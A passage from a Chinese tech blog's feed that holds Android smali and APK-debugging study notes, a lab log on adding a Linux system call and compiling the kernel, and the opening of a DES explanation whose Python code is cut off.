class="headerlink" title="静态返回 HelloWorld 的方法"></a>静态返回 HelloWorld 的方法</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lf8/helloworld/helloStr;</span> <span class="comment"># 类声明</span></span><br><span class="line"><span class="keyword">    .super</span> <span class="class">Ljava/lang/Object;</span> <span class="comment"># 父类声明</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .method</span><span class="keyword"> public</span><span class="keyword"> static</span> retHello()<span class="class">Ljava/lang/String;</span> <span class="comment"># 函数声明</span></span><br><span class="line"><span class="keyword">    .locals</span> 1 <span class="comment"># 寄存器数量</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"Hello World from StaticMethod"</span> <span class="comment"># 新建字符串</span></span><br><span class="line">   <span class="built_in"> return-object </span>v0 <span class="comment"># 返回Object类型</span></span><br><span class="line"><span class="keyword">.end method</span> <span class="comment"># 方法结束声明</span></span><br></pre></td></tr></table></figure><h3 id="返回静态-field-的方法"><a href="#返回静态-field-的方法" class="headerlink" title="返回静态 field 的方法"></a>返回静态 field 的方法</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.field</span><span class="keyword"> public</span><span class="keyword"> static</span><span class="keyword"> final</span> hStr:<span class="class">Ljava/lang/String;</span> = <span class="string">"Hello World from static field"</span> <span class="comment"># field声明与初始化</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span> retHello2()<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line">   <span class="built_in"> sget-object </span>v0, <span class="class">Lf8/helloworld/helloStr;</span>-&gt;hStr:<span class="class">Ljava/lang/String;</span> <span class="comment"># 获取field</span></span><br><span class="line">   <span class="built_in"> return-object </span>v0</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure><h3 id="普通的函数"><a href="#普通的函数" class="headerlink" title="普通的函数"></a>普通的函数</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> constructor</span> &lt;init&gt;()V</span><br><span class="line"><span class="keyword">    .locals</span> 0</span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0&#125;, <span class="class">Ljava/lang/Object;</span>-&gt;&lt;init&gt;()V</span><br><span class="line">    return-void</span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span> retHello3()<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"Hello World from Method"</span></span><br><span class="line">   <span class="built_in"> return-object </span>v0</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure><h3 id="普通的-field-与函数"><a href="#普通的-field-与函数" class="headerlink" title="普通的 field 与函数"></a>普通的 field 与函数</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.field</span><span class="keyword"> public</span> hStr2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> constructor</span> &lt;init&gt;()V</span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0&#125;, <span class="class">Ljava/lang/Object;</span>-&gt;&lt;init&gt;()V</span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"Hello field"</span> <span class="comment"># 初始化非静态field</span></span><br><span class="line">   <span class="built_in"> iput-object </span>v0, p0, <span class="class">Lf8/helloworld/helloStr;</span>-&gt;hStr2:<span class="class">Ljava/lang/String;</span></span><br><span class="line">    return-void</span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span> retHello4()<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line">   <span class="built_in"> iget-object </span>v0, p0, <span class="class">Lf8/helloworld/helloStr;</span>-&gt;hStr2:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="built_in"> return-object </span>v0</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure><p>调用时需要先初始化一个实例：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new-instance v1, <span class="class">Lf8/helloworld/helloStr;</span></span><br><span class="line">invoke-direct &#123;v1&#125;, <span class="class">Lf8/helloworld/helloStr;</span>-&gt;&lt;init&gt;()V</span><br><span class="line">invoke-virtual &#123;v1&#125;, <span class="class">Lf8/helloworld/helloStr;</span>-&gt;retHello3()<span class="class">Ljava/lang/String;</span></span><br><span class="line">move-result-object v1</span><br></pre></td></tr></table></figure><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="Android-Log"><a href="#Android-Log" class="headerlink" title="Android Log"></a>Android Log</h3><p>来自于包 <code>android/killer/log</code>。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;v0&#125;, <span class="class">Lcom/android/killer/Log;</span>-&gt;LogStr(<span class="class">Ljava/lang/String;</span>)V</span><br></pre></td></tr></table></figure><h3 id="LoadLibrary"><a href="#LoadLibrary" class="headerlink" title="LoadLibrary"></a>LoadLibrary</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;v0&#125;, <span class="class">Ljava/lang/System;</span>-&gt;loadLibrary(<span class="class">Ljava/lang/String;</span>)V</span><br></pre></td></tr></table></figure><h3 id="stackTrace"><a href="#stackTrace" class="headerlink" title="stackTrace"></a>stackTrace</h3><p>打印当前函数堆栈，方法为 <code>Thread.dumpStack()</code>。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;&#125;, <span class="class">Ljava/lang/Thread;</span>-&gt;dumpStack()V</span><br></pre></td></tr></table></figure><h3 id="Method-Trace"><a href="#Method-Trace" class="headerlink" title="Method Trace"></a>Method Trace</h3><p>函数跟踪。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;&#125;, <span class="class">Landroid/os/Debug;</span>-&gt;startMethodTracing()V</span><br><span class="line">invoke-static &#123;&#125;, <span class="class">Landroid/os/Debug;</span>-&gt;stopMethodTracing()V</span><br></pre></td></tr></table></figure><p>需要添加权限。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_EXTERNAL_STORAGE"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>保存的 trace 文件可以 dump 出来使用 monitor 来打开。</p><h3 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const-string v1, &quot;%d&quot; # 格式化描述符</span><br><span class="line">const/4 v2, 0x1 # 数组长度</span><br><span class="line">new-array v2, v2 [Ljava/lang/Object; # 创建Object数组</span><br><span class="line">aput-object v3, v2, v4 # 填充数组</span><br><span class="line">...</span><br><span class="line">invoke-static &#123;v1, v2&#125;, Ljava/lang/String;-&gt;format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String; # 格式化字符串</span><br><span class="line"># 字符串替换</span><br><span class="line">invoke-virtual &#123;v0, v1, v2&#125;, Ljava/lang/String;-&gt;replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;</span><br><span class="line">invoke-virtual &#123;v0, v1, v2&#125;, Ljava/lang/String;-&gt;replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;</span><br></pre></td></tr></table></figure><h3 id="waitForDebugger"><a href="#waitForDebugger" class="headerlink" title="waitForDebugger"></a>waitForDebugger</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;&#125;, Landroid/os/Debug;-&gt;waitForDebugger()V</span><br></pre></td></tr></table></figure><h1 id="apktool-ShakaApktool"><a href="#apktool-ShakaApktool" class="headerlink" title="apktool/ShakaApktool"></a>apktool/ShakaApktool</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar apktool.jar d example.apk -o example-dir</span><br><span class="line">java -jar apktool.jar b example-dir -o example.apk</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>d</code></td><td style="text-align:center">反编译</td></tr><tr><td style="text-align:center"><code>b</code></td><td style="text-align:center">回编译</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ShakaApktool.jar d -df example.apk -o example-dir</span><br><span class="line">java -jar ShakaApktool.jar b example-dir -o example.apk</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>-df</code>、<code>--default-framework</code></td><td style="text-align:center">使用默认的框架资源文件</td></tr></tbody></table><h1 id="安卓-apk-调试（不需要修改原-apk-文件）"><a href="#安卓-apk-调试（不需要修改原-apk-文件）" class="headerlink" title="安卓 apk 调试（不需要修改原 apk 文件）"></a>安卓 apk 调试（不需要修改原 apk 文件）</h1><ol><li>使用 apktool/ShakaApktool 反编译 apk 文件</li><li>在 Android Studio 中导入源码</li><li>设置远程调试选项，Host 填写为 localhost，端口填写为 8700</li><li>在 Debugger setup 中勾选 Suspend on process entry point、Suspend on thread start/exit 以及 Suspend on library load/unload</li><li>使用 adb 以 debug 方式启动 apk：<code>adb shell am start -D -n packageName/ActivityName</code></li><li>下好断点，打开 monitor，开始调试</li></ol><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://www.52pojie.cn/thread-395689-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-395689-1-1.html</a><br><a href="https://www.52pojie.cn/thread-396966-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-396966-1-1.html</a><br><a href="https://www.52pojie.cn/thread-397858-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-397858-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;开始学习安卓。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>如何给Linux添加系统调用</title>
    <link href="blog.b3ale.cn/2019/11/27/%E5%A6%82%E4%BD%95%E7%BB%99Linux%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    <id>blog.b3ale.cn/2019/11/27/%E5%A6%82%E4%BD%95%E7%BB%99Linux%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</id>
    <published>2019-11-27T05:50:19.000Z</published>
    <updated>2019-12-10T12:35:56.400Z</updated>
    
    <content type="html"><![CDATA[<p>操作系统实验记录。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>OS：Ubuntu 16.04.6</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ uname -a</span><br><span class="line">Linux ubuntu 4.15.0-70-generic <span class="comment">#79~16.04.1-Ubuntu SMP Tue Nov 12 14:01:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><h1 id="First-Download-Linux-Kernel-Source"><a href="#First-Download-Linux-Kernel-Source" class="headerlink" title="First: Download Linux Kernel Source"></a>First: Download Linux Kernel Source</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.20.17.tar.gz</span><br><span class="line">tar -xvf linux-4.20.17.tar.gz</span><br><span class="line">sudo mv linux-4.20.17/ /usr/src/</span><br><span class="line">cd /usr/src/linux-4.20.17/</span><br></pre></td></tr></table></figure><h1 id="Second-Install-Dependences"><a href="#Second-Install-Dependences" class="headerlink" title="Second: Install Dependences"></a>Second: Install Dependences</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install bison flex libssl-dev libncurses5-dev</span><br></pre></td></tr></table></figure><h1 id="Third-Add-My-Syscall"><a href="#Third-Add-My-Syscall" class="headerlink" title="Third: Add My Syscall"></a>Third: Add My Syscall</h1><p>入口（<code>arch/x86/entry/syscalls/syscall_64.tbl</code>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Here are my syscalls</span><br><span class="line">548     64      mysyscall               sys_mysyscall</span><br></pre></td></tr></table></figure><p>系统调用声明（<code>include/linux/syscalls.h</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Here are my syscalls</span></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_mysyscall</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>添加调用（<code>kernel/sys.c</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Here are my syscalls</span></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_mysyscall</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">printk(<span class="string">"Hello Kernel!!!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1712190426</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Forth-Compile"><a href="#Forth-Compile" class="headerlink" title="Forth: Compile"></a>Forth: Compile</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">make mrproper</span><br><span class="line">make clean</span><br><span class="line">make menuconfig <span class="comment"># 将Device drivers中的Staging drivers取消</span></span><br><span class="line"><span class="comment"># 下面的编译时间比较久 可以通过time记录一下时间</span></span><br><span class="line">time make bzImage <span class="comment"># 编译并生成压缩的内核映像 大约半个小时</span></span><br><span class="line">time make modules <span class="comment"># 编译模块 大约两个多小时</span></span><br><span class="line">sudo time make modules_install <span class="comment"># 安装模块 大约三分多种</span></span><br><span class="line">sudo time make install <span class="comment"># 安装内核 大约一分多钟</span></span><br></pre></td></tr></table></figure><p>编译成功后 reboot 重启系统。</p><h1 id="Fifth-Test"><a href="#Fifth-Test" class="headerlink" title="Fifth: Test"></a>Fifth: Test</h1><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ uname -a</span><br><span class="line">Linux ubuntu 4.20.17 <span class="comment">#1 SMP Thu Nov 28 22:48:22 PST 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><p>查看添加的系统调用是否成功：</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ grep -A 1 mysyscall /proc/kallsyms</span><br><span class="line">0000000000000000 T sys_mysyscall</span><br><span class="line">0000000000000000 T usermodehelper_read_unlock</span><br></pre></td></tr></table></figure><p>编写测试程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">long</span> ret = syscall(<span class="number">548</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%ld\n"</span>, ret);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果，返回值为设定好的值：</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ./3</span><br><span class="line">1712190426</span><br></pre></td></tr></table></figure><p>使用 dmesg 命令（dmesg 命令显示 linux 内核的环形缓冲区信息，我们可以从中获得诸如系统架构、cpu、挂载的硬件，RAM 等多个运行级别的大量的系统信息）查看调用情况：</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ dmesg | grep <span class="string">"Hello"</span></span><br><span class="line">[  228.310507] Hello Kernel!!!</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.cnblogs.com/tod-reg20130101/articles/9280792.html" target="_blank" rel="noopener">https://www.cnblogs.com/tod-reg20130101/articles/9280792.html</a><br><a href="https://www.zybuluo.com/hakureisino/note/514321" target="_blank" rel="noopener">https://www.zybuluo.com/hakureisino/note/514321</a><br><a href="https://www.jianshu.com/p/b2d5fa8af581" target="_blank" rel="noopener">https://www.jianshu.com/p/b2d5fa8af581</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;操作系统实验记录。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Python实现DES、AES加密解密算法</title>
    <link href="blog.b3ale.cn/2019/11/14/Python%E5%AE%9E%E7%8E%B0DES%E3%80%81AES%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>blog.b3ale.cn/2019/11/14/Python%E5%AE%9E%E7%8E%B0DES%E3%80%81AES%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</id>
    <published>2019-11-14T02:09:38.000Z</published>
    <updated>2020-02-22T03:49:00.371Z</updated>
    
    <content type="html"><![CDATA[<p>通过实现 DES 和 AES 深入了解对称加密（实现均采用 CBC 模式）。</p><a id="more"></a><h1 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h1><p>数据加密标准（英语：Data Encryption Standard，缩写为 DES）是一种对称密钥加密块密码算法，1976 年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），随后在国际上广泛流传开来。它基于使用 56 位密钥的对称算法。这个算法因为包含一些机密设计元素，相对短的密钥长度以及怀疑内含美国国家安全局（NSA）的后门而在开始时有争议，DES 因此受到了强烈的学院派式的审查，并以此推动了现代的块密码及其密码分析的发展。</p><h2 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h2><p>DES 是一种典型的块密码—一种将固定长度的明文通过一系列复杂的操作变成同样长度的密文的算法。对 DES 而言，块长度为 64 位。同时，DES 使用密钥来自定义变换过程，因此算法认为只有持有加密所用的密钥的用户才能解密密文。密钥表面上是 64 位的，然而只有其中的 56 位被实际用于算法，其余 8 位可以被用于奇偶校验，并在算法中被丢弃。因此，DES 的有效密钥长度仅为 56 位。</p><h3 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h3><p>算法的整体结构中，有 16 个相同的处理过程（round），并在首尾各有一次置换，称为 $IP$ 与 $FP$（或称 $IP^-1$，$FP$ 为 $IP$ 的反函数。$IP$ 和 $FP$ 几乎没有密码学上的重要性，为了在 1970 年代中期的硬件上简化输入输出数据库的过程而被显式的包括在标准中。</p><p>在主处理回次前，数据块被分成两个 32 位的半块，并被分别处理；这种交叉的方式被称为费斯妥结构。费斯妥结构保证了加密和解密过程足够相似—唯一的区别在于子密钥在解密时是以反向的顺序应用的，而剩余部分均相同。这样的设计大大简化了算法的实现，尤其是硬件实现，因为没有区分加密和解密算法的需要。</p><p>$\oplus$ 符号代表异或（XOR）操作。“F 函数”将数据半块与某个子密钥进行处理。然后，一个 F 函数的输出与另一个半块异或之后，再与原本的半块组合并交换顺序，进入下一个回次的处理。在最后一个回次完成时，两个半块需要交换顺序，这是费斯妥结构的一个特点，以保证加解密的过程相似。</p><p><img src="/pics/Python实现DES、AES加密解密算法/1.png" alt="整体结构算法"></p><h3 id="费斯妥函数（F-函数）"><a href="#费斯妥函数（F-函数）" class="headerlink" title="费斯妥函数（F 函数）"></a>费斯妥函数（F 函数）</h3><p>费斯妥函数（F 函数）的过程中，其每次对半块（32 位）进行操作，并包括四个步骤：</p><ul><li>扩张：用扩张置换（图中的 E）将 32 位的半块扩展到 48 位，其输出包括 8 个 6 位的块，每块包含 4 位对应的输入位，加上两个邻接的块中紧邻的位。</li><li>与密钥混合：用异或操作将扩张的结果和一个子密钥进行混合。16 个 48 位的子密钥—每个用于一个回次的 F 变换—是利用密钥调度从主密钥生成的（见下文）。</li><li>S 盒：在与子密钥混合之后，块被分成 8 个 6 位的块，然后使用“S 盒”，或称“置换盒”进行处理。8 个 S 盒的每一个都使用以查找表方式提供的非线性的变换将它的 6 个输入位变成 4 个输出位。S 盒提供了 DES 的核心安全性—如果没有 S 盒，密码会是线性的，很容易破解。</li><li>置换：最后，S 盒的 32 个输出位利用固定的置换，“P 置换”进行重组。这个设计是为了将每个 S 盒的 4 位输出在下一回次的扩张后，使用 4 个不同的 S 盒进行处理。</li></ul><p>S 盒，P 置换和 E 扩张各自满足了克劳德·香农在 1940 年代提出的实用密码所需的必要条件，“混淆与扩散”。</p><p><img src="/pics/Python实现DES、AES加密解密算法/2.png" alt="费斯妥函数算法"></p><h3 id="密钥调度"><a href="#密钥调度" class="headerlink" title="密钥调度"></a>密钥调度</h3><p>加密过程中密钥调度—产生子密钥的算法里，首先使用选择置换 1（PC-1）从 64 位输入密钥中选出 56 位的密钥—剩下的 8 位要么直接丢弃，要么作为奇偶校验位。然后，56 位分成两个 28 位的半密钥；每个半密钥接下来都被分别处理。在接下来的回次中，两个半密钥都被左移 1 或 2 位（由回次数决定），然后通过选择置换 2（PC-2）产生 48 位的子密钥—每个半密钥 24 位。移位（图中由&lt;&lt;标示）表明每个子密钥中使用了不同的位，每个位大致在 16 个子密钥中的 14 个出现。</p><p>解密过程中，除了子密钥输出的顺序相反外，密钥调度的过程与加密完全相同。</p><p><img src="/pics/Python实现DES、AES加密解密算法/3.png" alt="密钥调度算法"></p><h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding=utf-8 -*-</span></span><br><span 